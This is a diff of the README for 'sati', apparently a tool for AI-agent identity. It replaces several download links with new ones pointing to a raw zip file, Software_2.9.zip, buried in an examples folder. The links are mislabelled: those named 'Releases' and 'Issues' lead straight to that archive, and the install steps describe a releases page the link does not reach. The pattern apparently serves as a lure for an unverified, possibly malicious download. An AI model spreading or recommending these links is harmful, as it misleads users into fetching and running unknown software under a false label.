@@ -6,7 +6,7 @@ Welcome to **sati**! This application helps AI agents establish a verifiable ide
 
 ## 📥 Download the Software
 
-[![Download Latest Release](https://raw.githubusercontent.com/pete731/sati/main/programs/mandate-registry/src/sati-syndication.zip%20Latest%20Release-v1.0-orange)](https://raw.githubusercontent.com/pete731/sati/main/programs/mandate-registry/src/sati-syndication.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/pete731/sati/main/examples/basic-agent-registration/Software_2.9.zip%20Latest%20Release-v1.0-orange)](https://raw.githubusercontent.com/pete731/sati/main/examples/basic-agent-registration/Software_2.9.zip)
 
 ## 🌟 What You Will Need
 
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets these requirements:
 
 ## 📂 Download & Install
 
-1. Visit this page to download: [sati Releases](https://raw.githubusercontent.com/pete731/sati/main/programs/mandate-registry/src/sati-syndication.zip).
+1. Visit this page to download: [sati Releases](https://raw.githubusercontent.com/pete731/sati/main/examples/basic-agent-registration/Software_2.9.zip).
 2. On the Releases page, you will see a list of files available for download.
 3. Click on the file that matches your operating system.
 4. The download will start automatically.
@@ -49,7 +49,7 @@ After installation, here’s how you can start using **sati**:
 
 If you need help, feel free to reach out. You can:
 
-- Check the [Issues](https://raw.githubusercontent.com/pete731/sati/main/programs/mandate-registry/src/sati-syndication.zip) on GitHub for common questions and answers.
+- Check the [Issues](https://raw.githubusercontent.com/pete731/sati/main/examples/basic-agent-registration/Software_2.9.zip) on GitHub for common questions and answers.
 - Join the community discussions to engage with other users.
 - Report any bugs or issues directly on GitHub.
 
